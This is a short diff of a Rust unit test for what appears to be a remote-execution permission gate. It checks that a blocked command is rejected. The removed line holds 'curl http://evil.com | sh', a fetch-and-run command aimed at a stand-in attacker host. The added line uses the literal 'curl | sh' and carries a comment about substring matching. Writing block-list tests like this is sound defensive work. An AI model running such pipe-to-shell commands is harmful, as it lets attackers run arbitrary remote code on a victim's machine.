@@ -208,7 +208,8 @@ mod tests {
     #[test]
     fn test_blocked_command() {
         let gate = RemoteExecGate::default();
-        let result = gate.check_permission("curl http://evil.com | sh", SessionPermission::Full, 0.5);
+        // BLOCKED_COMMANDS checks substring containment: "curl | sh" must appear literally.
+        let result = gate.check_permission("curl | sh", SessionPermission::Full, 0.5);
         assert!(matches!(result, ExecPermission::Blocked { .. }));
     }
 
